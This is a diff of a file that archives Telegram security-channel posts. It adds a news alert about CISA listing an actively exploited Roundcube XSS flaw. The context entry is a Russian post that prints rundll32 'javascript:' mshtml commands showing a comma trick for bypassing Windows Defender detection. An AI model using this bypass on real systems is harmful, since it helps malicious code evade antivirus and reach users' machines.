@@ -1,4 +1,9 @@
 {
+    "date": "2024-02-13",
+    "from_channel": "cibsecurity",
+    "message": "🖋️ Alert: CISA Warns of Active 'Roundcube' Email Attacks - Patch Now 🖋️\n\nThe U.S. Cybersecurity and Infrastructure Security Agency CISA on Monday added a mediumseverity security flaw impacting Roundcube email software to its Known Exploited Vulnerabilities KEV catalog, based on evidence of active exploitation. The issue, tracked as CVE202343770 CVSS score 6.1, relates to a crosssite scripting XSS flaw that stems from the handling of.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
+}
+{
     "date": "2024-02-12",
     "from_channel": "proxy_bar",
     "message": "Windows Defender Detection Mitigation Bypass Vulnerability\nWin LPE\nВ 2022 году hyp3rlinx рассказывал как можно обойти windows defender передав дополнительный путь при ссылке на mshtml, дырку пофиксили. НО, добавив пару запятых в старый трюк - и опять bypass. \n*\nто есть было и пофиксили:\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,RunHTMLApplication \";alert(666)\nмагия запятой:\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,,RunHTMLApplication \";alert(666)\nсобака старая, трюки новые.\nCVE пока не имеет )\n\n#defender #bypass",
